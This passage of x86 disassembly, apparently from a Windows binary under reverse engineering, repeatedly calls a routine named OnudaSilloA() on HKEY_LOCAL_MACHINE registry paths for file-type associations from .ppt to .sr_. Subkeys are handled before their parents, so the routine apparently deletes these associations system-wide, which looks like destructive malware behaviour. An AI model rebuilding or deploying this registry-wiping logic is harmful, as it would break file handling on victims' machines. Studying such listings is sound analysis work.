  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002B3h
  push 00427590h ; "SOFTWARE\Classes\.ppt\PowerPoint.Show.4\ShellNew"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002B4h
  push 004275F8h ; "SOFTWARE\Classes\.ppt\PowerPoint.Show.4"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002B5h
  push 0042764Ch ; "SOFTWARE\Classes\.ppt\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002B6h
  push 004276B8h ; "SOFTWARE\Classes\.ppt"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002B7h
  push 004276E8h ; "SOFTWARE\Classes\.prf"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002B8h
  push 00427718h ; "SOFTWARE\Classes\.ps"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002B9h
  push 00427748h ; "SOFTWARE\Classes\.psd\PersistentHandler"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002BAh
  push 0042779Ch ; "SOFTWARE\Classes\.psd"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002BBh
  push 004277CCh ; "SOFTWARE\Classes\.psw"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002BCh
  push 004277FCh ; "SOFTWARE\Classes\.qds"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002BDh
  push 0042782Ch ; "SOFTWARE\Classes\.qt"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002BEh
  push 0042788Ch ; "SOFTWARE\Classes\.qtl\Shell\Open\Command"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002BFh
  push 004278E4h ; "SOFTWARE\Classes\.qtl\Shell\Open"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002C0h
  push 0042792Ch ; "SOFTWARE\Classes\.qtl\Shell"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002C1h
  push 00427968h ; "SOFTWARE\Classes\.qtl\DefaultIcon"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002C2h
  push 004279B0h ; "SOFTWARE\Classes\.qtl"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002C3h
  push 004279E0h ; "SOFTWARE\Classes\.r00"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002C4h
  push 00427A10h ; "SOFTWARE\Classes\.r01"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002C5h
  push 0042785Ch ; "SOFTWARE\Classes\.r02"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002C6h
  push 00427A68h ; "SOFTWARE\Classes\.r03"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002C7h
  push 00427A98h ; "SOFTWARE\Classes\.r04"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002C8h
  push 00427AC8h ; "SOFTWARE\Classes\.r05"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002C9h
  push 00427AF8h ; "SOFTWARE\Classes\.r06"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002CAh
  push 00427B28h ; "SOFTWARE\Classes\.r07"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002CBh
  push 00427B58h ; "SOFTWARE\Classes\.r08"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002CCh
  push 00427B88h ; "SOFTWARE\Classes\.r09"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002CDh
  push 00427BB8h ; "SOFTWARE\Classes\.r10"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002CEh
  push 00427BE8h ; "SOFTWARE\Classes\.r11"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002CFh
  push 00427C38h ; "SOFTWARE\Classes\.r12"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002D0h
  push 00427C68h ; "SOFTWARE\Classes\.r13"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002D1h
  push 00427C98h ; "SOFTWARE\Classes\.r14"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002D2h
  push 00427CC8h ; "SOFTWARE\Classes\.r15"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002D3h
  push 00427CF8h ; "SOFTWARE\Classes\.r16"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002D4h
  push 00427D28h ; "SOFTWARE\Classes\.r17"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002D5h
  push 00427D58h ; "SOFTWARE\Classes\.r18"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002D6h
  push 00427D88h ; "SOFTWARE\Classes\.r19"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002D7h
  push 00427DB8h ; "SOFTWARE\Classes\.r20"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002D8h
  push 00427E10h ; "SOFTWARE\Classes\.r21"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002D9h
  push 00427E40h ; "SOFTWARE\Classes\.r22"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002DAh
  push 00427E70h ; "SOFTWARE\Classes\.r23"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002DBh
  push 00427EA0h ; "SOFTWARE\Classes\.r24"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002DCh
  push 00427ED0h ; "SOFTWARE\Classes\.r25"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002DDh
  push 00427F00h ; "SOFTWARE\Classes\.r26"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002DEh
  push 00427F30h ; "SOFTWARE\Classes\.r27"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002DFh
  push 00427F60h ; "SOFTWARE\Classes\.r28"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002E0h
  push 00427F90h ; "SOFTWARE\Classes\.r29"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002E1h
  push 00427FE8h ; "SOFTWARE\Classes\.ra"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002E2h
  push 00428018h ; "SOFTWARE\Classes\.ram"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002E3h
  push 00428048h ; "SOFTWARE\Classes\.rar\ShellNew"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002E4h
  push 0042808Ch ; "SOFTWARE\Classes\.rar"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002E5h
  push 004280BCh ; "SOFTWARE\Classes\.rat"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002E6h
  push 004280ECh ; "SOFTWARE\Classes\.rc\PersistentHandler"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002E7h
  push 00428140h ; "SOFTWARE\Classes\.rc"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002E8h
  push 00428170h ; "SOFTWARE\Classes\.RDP"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002E9h
  push 004281C4h ; "SOFTWARE\Classes\.reg\PersistentHandler"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002EAh
  push 00428218h ; "SOFTWARE\Classes\.reg"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002EBh
  push 00428248h ; "SOFTWARE\Classes\.res\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002ECh
  push 0042829Ch ; "SOFTWARE\Classes\.res"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002EDh
  push 004282CCh ; "SOFTWARE\Classes\.rev"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002EEh
  push 004282FCh ; "SOFTWARE\Classes\.rle\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002EFh
  push 00428350h ; "SOFTWARE\Classes\.rle"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002F0h
  push 004283A4h ; "SOFTWARE\Classes\.rm"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002F1h
  push 004283D4h ; "SOFTWARE\Classes\.rmi\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002F2h
  push 00428428h ; "SOFTWARE\Classes\.rmi\OpenWithProgIds"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002F3h
  push 00428478h ; "SOFTWARE\Classes\.rmi\OpenWithList\wmplayer.exe"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002F4h
  push 004284DCh ; "SOFTWARE\Classes\.rmi\OpenWithList"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002F5h
  push 00428528h ; "SOFTWARE\Classes\.rmi"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002F6h
  push 00428588h ; "SOFTWARE\Classes\.rmvb"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002F7h
  push 004285BCh ; "SOFTWARE\Classes\.rnk"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002F8h
  push 004285ECh ; "SOFTWARE\Classes\.rpc\PersistentHandler"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002F9h
  push 00428640h ; "SOFTWARE\Classes\.rpc"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002FAh
  push 00428670h ; "SOFTWARE\Classes\.rpm"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002FBh
  push 004286A0h ; "SOFTWARE\Classes\.rsp\PersistentHandler"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002FCh
  push 004286F4h ; "SOFTWARE\Classes\.rsp"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002FDh
  push 00428724h ; "SOFTWARE\Classes\.rtf\ShellNew"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002FEh
  push 00428768h ; "SOFTWARE\Classes\.rtf\PersistentHandler"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002FFh
  push 004287BCh ; "SOFTWARE\Classes\.rtf\OpenWithList\WordPad.exe"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000300h
  push 00428820h ; "SOFTWARE\Classes\.rtf\OpenWithList"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000301h
  push 0042886Ch ; "SOFTWARE\Classes\.rtf"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000302h
  push 0042889Ch ; "SOFTWARE\Classes\.sam\AmiProDocument\ShellNew"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000303h
  push 004288FCh ; "SOFTWARE\Classes\.sam\AmiProDocument"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000304h
  push 00428558h ; "SOFTWARE\Classes\.sam"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000305h
  push 00428950h ; "SOFTWARE\Classes\.sbr\PersistentHandler"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000306h
  push 004289A4h ; "SOFTWARE\Classes\.sbr"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000307h
  push 004289D4h ; "SOFTWARE\Classes\.sc2\PersistentHandler"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000308h
  push 00428A28h ; "SOFTWARE\Classes\.sc2"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000309h
  push 00428A58h ; "SOFTWARE\Classes\.scf"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000030Ah
  push 00428A88h ; "SOFTWARE\Classes\.scp"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000030Bh
  push 00428AB8h ; "SOFTWARE\Classes\.scr"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000030Ch
  push 00428AE8h ; "SOFTWARE\Classes\.sct"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000030Dh
  push 00428B2Ch ; "SOFTWARE\Classes\.sdb"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000030Eh
  push 00428B5Ch ; "SOFTWARE\Classes\.sed"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000030Fh
  push 00428B8Ch ; "SOFTWARE\Classes\.shb"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000310h
  push 00428BBCh ; "SOFTWARE\Classes\.shs"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000311h
  push 00428BECh ; "SOFTWARE\Classes\.shtml"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000312h
  push 00428C20h ; "SOFTWARE\Classes\.shw\Presentations31.Show\ShellNew"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000313h
  push 00428C8Ch ; "SOFTWARE\Classes\.shw\Presentations31.Show"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000314h
  push 00428D0Ch ; "SOFTWARE\Classes\.shw"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000315h
  push 00428D3Ch ; "SOFTWARE\Classes\.sit\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000316h
  push 00428D90h ; "SOFTWARE\Classes\.sit"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000317h
  push 00428DC0h ; "SOFTWARE\Classes\.snd\PersistentHandler"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000318h
  push 00428E14h ; "SOFTWARE\Classes\.snd\OpenWithProgIds"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000319h
  push 00428E64h ; "SOFTWARE\Classes\.snd\OpenWithList\wmplayer.exe"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000031Ah
  push 00428EF0h ; "SOFTWARE\Classes\.snd\OpenWithList"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000031Bh
  push 00428F3Ch ; "SOFTWARE\Classes\.snd"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000031Ch
  push 00428F6Ch ; "SOFTWARE\Classes\.sol"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000031Dh
  push 00428F9Ch ; "SOFTWARE\Classes\.sor"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000031Eh
  push 00428FCCh ; "SOFTWARE\Classes\.spc"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000031Fh
  push 00428FFCh ; "SOFTWARE\Classes\.spl"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000320h
  push 0042902Ch ; "SOFTWARE\Classes\.sql"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000321h
  push 0042905Ch ; "SOFTWARE\Classes\.sr_\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000322h
  push 004290CCh ; "SOFTWARE\Classes\.sr_"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000323h
